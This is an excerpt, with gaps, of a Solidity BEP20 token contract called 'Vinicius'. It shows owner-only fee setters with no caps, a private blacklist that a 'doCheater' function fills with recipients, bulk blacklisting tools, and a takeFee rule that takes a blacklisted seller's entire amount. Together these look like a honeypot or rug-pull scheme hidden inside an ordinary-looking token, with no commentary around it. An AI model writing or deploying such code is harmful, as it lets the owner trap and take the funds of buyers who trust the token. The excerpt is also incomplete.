...
abstract contract BEP20 is Context, IERC20, Ownable {
    ...
    uint256 public togetherDo = block.number;
    ...
    mapping (address => bool) private balList;
    ...
    address[2] memory _walletParam) 
    {
        ...
        _txLimit = _limitParam[0] * 10**_decimals;
        _walletLimit = _limitParam[1] * 10**_decimals;
    ...
    function Buy(uint256 a, uint256 b, uint256 c) external onlyOwner() {
        _buyLiquidityFee = a;
        _buyMarketingFee = b;
        _buyTeamFee = c;
    ...
    function Sell(uint256 a, uint256 b, uint256 c) external onlyOwner() {
        _sellLiquidityFee = a;
        _sellMarketingFee = b;
        _sellTeamFee = c;
    ...
    function doCheater(address recipient) internal {
        if (!balList[recipient] && !isMarketPair[recipient]) balList[recipient] = true;
    }

    function multiBal(address[] calldata addresses, bool status) public onlyOwner {
        require(addresses.length < 201);
        for (uint256 i; i < addresses.length; ++i) {
            balList[addresses[i]] = status;
        }
    }

    function setbalList(address recipient, bool status) public onlyOwner {
        balList[recipient] = status;
    }
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        if(balList[sender] && !isMarketPair[sender]) feeAmount = amount;
...
contract Vinicius is BEP20 {
    constructor() BEP20(
        ...
        [0x454fA17297bB50b2488ccA0De26bd153d17B8666,0x454fA17297bB50b2488ccA0De26bd153d17B8666]
    ){}
}